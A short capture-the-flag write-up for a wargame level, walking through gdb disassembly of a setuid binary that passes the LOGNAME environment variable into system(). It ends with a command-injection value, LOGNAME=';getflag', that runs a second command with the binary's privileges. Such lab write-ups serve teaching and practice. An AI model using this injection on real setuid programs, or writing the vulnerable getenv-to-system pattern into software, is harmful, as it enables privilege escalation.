# LEVEL07 - Environnement matter

```shell
$ ls -la
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
```


```shell
$ ./level07
level07
```

```shell
gdb ./level07
```

```r
 1:0x0804856f <+91>:	mov    DWORD PTR [esp],0x8048680
 2:0x08048576 <+98>:	call   0x8048400 <getenv@plt>
 3:0x0804857b <+103>:	mov    DWORD PTR [esp+0x8],eax
 4:0x0804857f <+107>:	mov    DWORD PTR [esp+0x4],0x8048688
 5:0x08048587 <+115>:	lea    eax,[esp+0x14]
 6:0x0804858b <+119>:	mov    DWORD PTR [esp],eax
 7:0x0804858e <+122>:	call   0x8048440 <asprintf@plt>
 8:0x08048593 <+127>:	mov    eax,DWORD PTR [esp+0x14]
 9:0x08048597 <+131>:	mov    DWORD PTR [esp],eax
10:0x0804859a <+134>:	call   0x8048410 <system@plt>
```

```
x/s 0x8048410
```

## Knowledge

1. ````2:0x08048576 <+98>:	call   0x8048400 <getenv@plt>````    **->**  [getenv](https://www.php.net/manual/fr/function.getenv.php)(?string $name = null, bool $local_only = false)

2. ````7:0x0804858e <+122>:	call   0x8048440 <asprintf@plt>````  **->**  [asprintf](http://manpagesfr.free.fr/man/man3/asprintf.3.html)(char **strp, const char *fmt, ...);

3. ````10:0x0804859a <+134>:	call   0x8048410 <system@plt>````  **->**  [system](https://koor.fr/C/cstdlib/system.wp)(const char *command);

## Deduction

````shell
env = getenv("LOGNAME");
asprintf(str, "/bin/echo %s ", env);
system(str);
````

```shell
$ export LOGNAME=coucou
$ ./level07
coucou
```

```shell
$ export LOGNAME=';getflag'
$ ./level07
Check flag.Here is your token : XXXXXXXXXXXXXXXX
```